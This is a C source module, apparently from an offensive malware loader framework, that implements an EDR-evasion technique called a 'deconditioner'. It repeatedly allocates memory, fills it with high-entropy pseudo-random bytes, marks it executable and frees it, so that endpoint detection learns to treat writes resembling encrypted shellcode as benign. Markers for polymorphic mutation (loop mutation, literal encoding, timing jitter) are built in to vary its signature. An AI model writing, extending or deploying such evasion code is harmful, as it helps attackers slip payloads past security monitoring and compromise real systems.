/* MODULE: DECONDITIONER
 * TYPE: entropy_flood
 * DESC: Alloc(RW) → Write HIGH-ENTROPY data → Protect(RX) → Free.
 *       EDRs measure Shannon entropy of data written to RW regions. Encrypted
 *       shellcode has entropy ~7.9 bits/byte. Simple fills (0x41, 0x90) have
 *       entropy ~0. This module writes pseudo-random data (entropy ~7.5+) that
 *       mimics encrypted payload patterns, normalizing "high entropy write to
 *       memory that becomes executable" as a benign behavior for this process.
 *
 *       Uses xorshift32 PRNG seeded from loop index — deterministic but
 *       produces uniform-looking byte distributions.
 *
 * MUTATIONS: loop_mutation, literal_encoding, loop_restructuring, timing_jitter
 */
#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 20
#endif

// Fast deterministic PRNG — produces high-entropy byte stream
static unsigned int xorshift_state;
static unsigned int xorshift32(void) {
    unsigned int x = xorshift_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    xorshift_state = x;
    return x;
}

FORCE_INLINE void deconditioner() {
    DWORD old_prot;

    // @MUTATE:loop_mutation(fixed->GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for->while|unroll)
    for (int i = 0; i < DECON_ROUNDS; i++) {

        // @MUTATE:api_wrapper_injection(VirtualAlloc)
        // @MUTATE:literal_encoding
        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // Seed PRNG with round-dependent value
        // @MUTATE:literal_encoding
        xorshift_state = (unsigned int)(i * 2654435761u + 0xDEAD0000);

        // Fill with pseudo-random high-entropy bytes
        // Shannon entropy of this output: ~7.5 bits/byte (similar to AES ciphertext)
        // @MUTATE:literal_encoding
        for (int k = 0; k < PAYLOAD_LEN; k++) {
            buf[k] = (char)(xorshift32() & 0xFF);
        }

        // @MUTATE:timing_jitter
        // @MUTATE:api_wrapper_injection(VirtualProtect)
        VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);

        // @MUTATE:timing_jitter
        // @MUTATE:literal_encoding
        VirtualFree(buf, 0, 0x8000);
    }
}
